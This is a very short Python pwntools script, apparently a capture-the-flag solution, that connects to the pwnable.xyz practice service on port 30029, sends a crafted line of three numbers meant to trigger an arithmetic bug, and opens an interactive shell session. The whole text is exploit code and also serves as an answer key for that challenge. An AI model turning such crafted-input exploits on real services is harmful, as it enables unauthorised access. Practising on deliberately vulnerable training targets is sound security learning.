from pwn import *
 
p = remote("svc.pwnable.xyz", 30029)
 
p.sendline("1099511606504 1 -262898")
p.interactive()
